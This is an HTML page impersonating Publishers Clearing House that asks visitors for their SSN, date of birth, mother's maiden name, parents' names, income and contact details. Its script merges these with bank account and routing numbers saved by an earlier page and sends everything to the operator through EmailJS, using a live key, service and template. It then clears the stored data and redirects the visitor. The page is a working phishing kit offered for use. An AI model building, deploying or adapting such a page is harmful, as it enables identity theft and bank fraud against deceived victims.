<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Publishers Clearing House - Personal Information</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
  <style>
    body {
      background-color: #f5f5f5;
      font-family: 'Arial', sans-serif;
      color: #4a4a4a;
    }
    .container {
      max-width: 600px;
      margin-top: 40px;
    }
    .pch-logo {
      max-width: 200px;
      margin-bottom: 20px;
    }
    .card {
      border: none;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      background-color: #ffffff;
    }
    .card-header {
      background-color: #f28c38;
      color: #ffffff;
      text-align: center;
      padding: 15px;
      border-top-left-radius: 10px;
      border-top-right-radius: 10px;
      font-size: 1.5rem;
      font-weight: bold;
    }
    .form-label {
      color: #666666;
      font-weight: 500;
    }
    .form-control {
      border-color: #cccccc;
      border-radius: 5px;
    }
    .form-control:focus {
      border-color: #f28c38;
      box-shadow: 0 0 5px rgba(242, 140, 56, 0.5);
    }
    .btn-primary {
      background-color: #f28c38;
      border: none;
      padding: 10px;
      font-weight: 600;
    }
    .btn-primary:hover {
      background-color: #e0701d;
    }
    .required::after {
      content: " *";
      color: #dc3545;
    }
    #errorMessage {
      font-size: 0.9rem;
    }
  </style>
</head>
<body>
  <div class="container text-center">
    <img src="images/pch-logo.png" alt="PCH Logo" class="img-fluid pch-logo">
    <div class="card mx-auto">
      <div class="card-header">Personal Information</div>
      <div class="card-body">
        <form id="personalInfoForm">
          <div class="mb-3 text-start">
            <label for="fullName" class="form-label required">Full Name</label>
            <input type="text" class="form-control" id="fullName" required>
          </div>
          <div class="mb-3 text-start">
            <label for="address" class="form-label required">Full Home Address</label>
            <input type="text" class="form-control" id="address" required>
          </div>
          <div class="mb-3 text-start">
            <label for="phone" class="form-label required">Phone Number</label>
            <input type="tel" class="form-control" id="phone" required>
          </div>
          <div class="mb-3 text-start">
            <label for="email" class="form-label required">E-mail</label>
            <input type="email" class="form-control" id="email" required>
          </div>
          <div class="mb-3 text-start">
            <label for="state" class="form-label required">State</label>
            <input type="text" class="form-control" id="state" required>
          </div>
          <div class="mb-3 text-start">
            <label for="sex" class="form-label required">Sex</label>
            <select class="form-control" id="sex" required>
              <option value="" disabled selected>Select</option>
              <option value="Male">Male</option>
              <option value="Female">Female</option>
              <option value="Other">Other</option>
            </select>
          </div>
          <div class="mb-3 text-start">
            <label for="ssn" class="form-label required">SSN</label>
            <input type="text" class="form-control" id="ssn" required>
          </div>
          <div class="mb-3 text-start">
            <label for="dob" class="form-label required">Date of Birth</label>
            <input type="date" class="form-control" id="dob" required>
          </div>
          <div class="mb-3 text-start">
            <label for="maritalStatus" class="form-label required">Marital Status</label>
            <select class="form-control" id="maritalStatus" required>
              <option value="" disabled selected>Select</option>
              <option value="Single">Single</option>
              <option value="Married">Married</option>
              <option value="Divorced">Divorced</option>
              <option value="Widowed">Widowed</option>
            </select>
          </div>
          <div class="mb-3 text-start">
            <label for="monthlyIncome" class="form-label required">Monthly Income</label>
            <input type="number" class="form-control" id="monthlyIncome" required>
          </div>
          <div class="mb-3 text-start">
            <label for="mothersMaidenName" class="form-label required">Mother's Maiden Name</label>
            <input type="text" class="form-control" id="mothersMaidenName" required>
          </div>
          <div class="mb-3 text-start">
            <label for="cityBorn" class="form-label required">City of Birth</label>
            <input type="text" class="form-control" id="cityBorn" required>
          </div>
          <div class="mb-3 text-start">
            <label for="stateBorn" class="form-label required">State of Birth</label>
            <input type="text" class="form-control" id="stateBorn" required>
          </div>
          <div class="mb-3 text-start">
            <label for="fatherName" class="form-label required">Father's Full Name</label>
            <input type="text" class="form-control" id="fatherName" required>
          </div>
          <div class="mb-3 text-start">
            <label for="motherName" class="form-label required">Mother's Full Name</label>
            <input type="text" class="form-control" id="motherName" required>
          </div>
          <button type="submit" class="btn btn-primary w-100">Submit</button>
        </form>
        <p id="errorMessage" class="text-danger mt-3" style="display: none;">Failed to send email. Please try again.</p>
      </div>
    </div>
  </div>
  <script>
    // Initialize EmailJS SDK v4
    (function(){
      emailjs.init({
        publicKey: 'G7VoKu8d-oL220QSy' // Replace with your EmailJS Public Key
      });
    })();

    document.getElementById('personalInfoForm').addEventListener('submit', (e) => {
      e.preventDefault();

      const personalInfo = {
        fullName: document.getElementById('fullName').value,
        address: document.getElementById('address').value,
        phone: document.getElementById('phone').value,
        email: document.getElementById('email').value,
        state: document.getElementById('state').value,
        sex: document.getElementById('sex').value,
        ssn: document.getElementById('ssn').value,
        dob: document.getElementById('dob').value,
        maritalStatus: document.getElementById('maritalStatus').value,
        monthlyIncome: document.getElementById('monthlyIncome').value,
        mothersMaidenName: document.getElementById('mothersMaidenName').value,
        cityBorn: document.getElementById('cityBorn').value,
        stateBorn: document.getElementById('stateBorn').value,
        fatherName: document.getElementById('fatherName').value,
        motherName: document.getElementById('motherName').value
      };

      const bankDetails = JSON.parse(localStorage.getItem('bankDetails') || '{}');

      const templateParams = {
        bankName: bankDetails.bankName || 'N/A',
        accountNumber: bankDetails.accountNumber || 'N/A',
        routingNumber: bankDetails.routingNumber || 'N/A',
        ...personalInfo
      };

      console.log('Sending email with params:', templateParams); // Debug

      emailjs.send('service_h8n7luy', 'template_xempllr', templateParams)
        .then(() => {
          console.log('Email sent successfully');
          localStorage.removeItem('bankDetails');
          window.location.href = 'confirmation.html';
        }, (error) => {
          console.error('EmailJS error:', error);
          document.getElementById('errorMessage').style.display = 'block';
        });
    });
  </script>
</body>
</html>
